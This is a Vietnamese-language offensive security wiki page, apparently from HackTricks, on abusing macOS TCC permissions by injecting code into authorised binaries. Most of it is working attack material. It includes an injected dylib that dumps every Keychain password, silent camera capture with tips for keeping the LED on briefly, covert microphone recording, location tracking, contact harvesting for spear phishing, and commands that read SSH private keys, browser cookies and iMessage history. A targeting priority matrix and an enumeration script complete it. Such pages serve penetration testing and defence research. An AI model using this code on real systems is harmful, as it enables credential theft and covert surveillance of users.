# Đánh cắp thông tin xác thực và dữ liệu trên macOS qua quyền TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Tổng quan

TCC (Transparency, Consent, and Control) của macOS bảo vệ quyền truy cập vào dữ liệu nhạy cảm của người dùng. Khi attacker **chiếm quyền kiểm soát một binary đã được cấp quyền TCC**, họ thừa hưởng các quyền đó. Trang này ghi lại tiềm năng khai thác của từng quyền TCC liên quan đến đánh cắp dữ liệu.<sup>[[2]](#references)</sup>

> [!WARNING]
> Code injection vào một binary được cấp quyền TCC (thông qua DYLD injection, dylib hijacking hoặc task port) **âm thầm thừa hưởng tất cả quyền TCC của binary đó**. Không có prompt hay bước xác minh bổ sung nào khi cùng một process đọc dữ liệu được bảo vệ.<sup>[[4]](#references)</sup>

---

## Nhóm quyền truy cập Keychain

### Mục tiêu

macOS Keychain lưu trữ:
- **Mật khẩu Wi-Fi** — thông tin xác thực của tất cả mạng không dây đã lưu
- **Mật khẩu website** — mật khẩu của Safari, Chrome (khi dùng Keychain) và các trình duyệt khác
- **Mật khẩu ứng dụng** — tài khoản email, thông tin xác thực VPN, token phát triển
- **Chứng chỉ và private key** — dùng cho code signing, TLS client, mã hóa S/MIME
- **Ghi chú bảo mật** — các bí mật do người dùng lưu

### Entitlement: `keychain-access-groups`

Các mục Keychain được sắp xếp theo **nhóm truy cập**. Entitlement `keychain-access-groups` của ứng dụng liệt kê những nhóm mà ứng dụng có thể truy cập:<sup>[[1]](#references)</sup>

```xml
<key>keychain-access-groups</key>
<array>
    <string>com.apple.cfnetwork</string>   <!-- Network passwords -->
    <string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
    <string>apple</string>                  <!-- Broad Apple group -->
    <string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```

### Khai thác

```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
  AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```

### Code Injection → Đánh cắp Keychain

```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
    };
    
    CFArrayRef results = NULL;
    OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);
    
    if (status == errSecSuccess) {
        NSArray *items = (__bridge NSArray *)results;
        for (NSDictionary *item in items) {
            NSString *service = item[(__bridge id)kSecAttrService];
            NSString *account = item[(__bridge id)kSecAttrAccount];
            NSData *passData = item[(__bridge id)kSecValueData];
            NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
            // service, account, password — the full credential triple
        }
    }
}
```

---

## Truy cập Camera (kTCCServiceCamera)

### Khai thác

Một binary được cấp quyền camera qua `kTCCServiceCamera` hoặc entitlement `com.apple.security.device.camera` có thể chụp ảnh và quay video:

```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```

### Thu thập âm thầm

```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
    self.session = [[AVCaptureSession alloc] init];
    AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
    [self.session addInput:input];
    
    AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
    [output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
    [self.session addOutput:output];
    
    [self.session startRunning];
    // Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
    didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
    fromConnection:(AVCaptureConnection *)connection {
    // Each frame can be saved to disk or exfiltrated
    // Stop after capturing a few frames to minimize LED time
    [self.session stopRunning];
}
@end
```

> [!TIP]
> Bắt đầu từ **macOS Sonoma**, chỉ báo camera trên thanh menu luôn hiển thị và không thể bị ẩn bằng lập trình. Trên **các phiên bản macOS cũ hơn**, một lần ghi hình ngắn có thể không hiển thị chỉ báo dễ nhận thấy.

---

## Quyền truy cập microphone (kTCCServiceMicrophone)

### Exploitation

Quyền truy cập microphone thu toàn bộ âm thanh từ mic tích hợp, tai nghe hoặc các thiết bị đầu vào âm thanh được kết nối:

```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```

### Tấn công: Ghi âm môi trường

```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
    NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
    NSDictionary *settings = @{
        AVFormatIDKey: @(kAudioFormatMPEG4AAC),
        AVSampleRateKey: @44100.0,
        AVNumberOfChannelsKey: @1
    };
    AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
    [recorder record];
    // Records everything: conversations, phone calls, ambient audio
    
    // Stop after a duration
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{
        [recorder stop];
        // Exfiltrate /tmp/recording.m4a
    });
}
```

---

## Theo dõi vị trí (kTCCServiceLocation)

### Exploitation

```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```

### Theo dõi liên tục

```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
    CLLocationManager *mgr = [[CLLocationManager alloc] init];
    mgr.delegate = self;
    mgr.desiredAccuracy = kCLLocationAccuracyBest;
    [mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
     didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *loc = locations.lastObject;
    // loc.coordinate.latitude, loc.coordinate.longitude
    // Reveals: home address, work address, travel patterns, daily routine
    NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
        loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
    // Append to tracking log
}
@end
```

---

## Danh bạ / Lịch / Ảnh

### Trích xuất dữ liệu cá nhân

| Dịch vụ TCC | Framework | Dữ liệu |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Tên, email, số điện thoại, địa chỉ |
| `kTCCServiceCalendar` | `EventKit` | Cuộc họp, người tham dự, địa điểm |
| `kTCCServicePhotos` | `Photos.framework` | Ảnh, ảnh chụp màn hình, metadata vị trí |

```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
  echo "=== $svc ==="
  sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```

### Thu thập danh bạ

```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
                  CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
    usingBlock:^(CNContact *contact, BOOL *stop) {
    // contact.givenName, contact.familyName
    // contact.emailAddresses, contact.phoneNumbers
    // All contacts exfiltrated for social engineering / spear phishing
}];
```

---

## Truy cập tài khoản iCloud

### Entitlement: `com.apple.private.icloud-account-access`

Entitlement này cho phép giao tiếp với dịch vụ XPC `com.apple.iCloudHelper`, cung cấp quyền truy cập vào:
- **iCloud tokens** — token xác thực cho Apple ID của người dùng
- **iCloud Drive** — tài liệu được đồng bộ hóa từ tất cả thiết bị
- **iCloud Keychain** — mật khẩu được đồng bộ hóa trên tất cả thiết bị Apple
- **Find My** — vị trí của tất cả thiết bị Apple của người dùng<sup>[[3]](#references)</sup>

```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```

> [!CAUTION]
> Xâm nhập một binary có entitlement iCloud mở rộng cuộc tấn công từ **một thiết bị duy nhất sang toàn bộ hệ sinh thái Apple**: các máy Mac, iPhone, iPad và Apple Watch khác. iCloud Keychain sync đồng nghĩa với việc có thể truy cập mật khẩu từ tất cả thiết bị.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### Quyền TCC mạnh nhất

Full Disk Access cấp quyền đọc **mọi tệp trên hệ thống**, bao gồm:
- Dữ liệu của các ứng dụng khác (Messages, Mail, lịch sử Safari)
- Cơ sở dữ liệu TCC (tiết lộ mọi quyền khác)
- SSH keys và cấu hình
- Cookies trình duyệt và session tokens
- Cơ sở dữ liệu và cache của ứng dụng

```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```

---

## Ma trận ưu tiên khai thác

Khi đánh giá các binary được cấp quyền TCC có thể inject, hãy ưu tiên dựa trên giá trị dữ liệu:

| Mức ưu tiên | Quyền TCC | Lý do |
|---|---|---|
| **Critical** | Full Disk Access | Truy cập mọi thứ |
| **Critical** | TCC Manager | Có thể cấp bất kỳ quyền nào |
| **High** | Keychain Access Groups | Toàn bộ mật khẩu đã lưu |
| **High** | iCloud Account Access | Xâm nhập nhiều thiết bị |
| **High** | Input Monitoring (ListenEvent) | Keylogging |
| **High** | Accessibility | Điều khiển GUI, tự cấp quyền |
| **Medium** | Screen Capture | Thu thập dữ liệu hình ảnh |
| **Medium** | Camera + Microphone | Giám sát |
| **Medium** | Contacts + Calendar | Dữ liệu phục vụ social engineering |
| **Low** | Location | Theo dõi vị trí thực tế |
| **Low** | Photos | Dữ liệu cá nhân |

## Script liệt kê

```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
  AND tccPermsStr IS NOT NULL
  AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
  AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```

## References

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "Điều gì xảy ra trên máy Mac của bạn sẽ ở lại trên iCloud của Apple?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — Khai thác TCC](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
